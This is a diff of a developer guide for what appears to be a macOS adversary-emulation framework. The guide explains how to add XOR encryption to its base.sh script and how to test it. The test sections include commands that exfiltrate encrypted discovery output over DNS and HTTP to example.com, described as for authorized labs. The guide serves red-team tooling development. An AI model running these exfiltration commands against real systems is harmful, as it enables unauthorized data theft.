@@ -1,6 +1,8 @@
 # Enhancing Existing Features in base.sh
 
-This guide explains how to enhance existing features in the `base.sh` script, using the addition of XOR encryption to the existing encryption framework as a practical example.
+**Scope:** Edits to [`attackmacos/core/base/base.sh`](../../../attackmacos/core/base/base.sh). For new techniques without base changes, use [Create a New TTP Fast.md](Create%20a%20New%20TTP%20Fast.md).
+
+This guide explains how to enhance existing features in `base.sh`, using XOR encryption in the encryption framework as a practical example.
 
 ## Understanding Feature Enhancement
 
@@ -166,18 +168,15 @@ Encryption Options:
 
 ### Step 7: Test Thoroughly
 
-We test our enhanced feature to ensure it works correctly with the existing pipeline:
+Use a **built** procedure script (merged `base.sh` + technique) so parsing and validation match production:
 
 ```sh
-# Test basic XOR encryption
-./base.sh --ls --encrypt xor
-
-# Test with JSON format
-./base.sh --ls --encrypt xor --format json
-
-# Test with debug output to see the key
-./base.sh --ls --encrypt xor --debug
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --encrypt xor --help
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --encrypt xor --format json
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --encrypt xor --debug
 ```
+
+Before runtime tests, run `./attackmacos/attackmacos.sh --lint-local --tactic <slug> --ttp <procedure_name>`.
 
 And verify the output contains the XOR-encrypted data and the correct metadata.
 
@@ -207,14 +206,11 @@ And verify the output contains the XOR-encrypted data and the correct metadata.
 
 ## Testing XOR Encryption with Exfiltration
 
-To test that our XOR encryption properly works with the exfiltration mechanism:
+To test that XOR encryption works with exfiltration (authorized lab only):
 
 ```sh
-# Test XOR encryption with DNS exfiltration
-./base.sh --ls --encrypt xor --exfil-dns example.com --debug
-
-# Test XOR encryption with HTTP exfiltration
-./base.sh --ls --encrypt xor --exfil-http http://example.com/collector --debug
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --encrypt xor --exfil-dns example.com --debug
+bash attackmacos/ttp/discovery/shell/<procedure_name>.sh --encrypt xor --exfil-http https://example.com/collector --debug
 ```
 
 The debug flag will show the encryption key being used, allowing verification that:
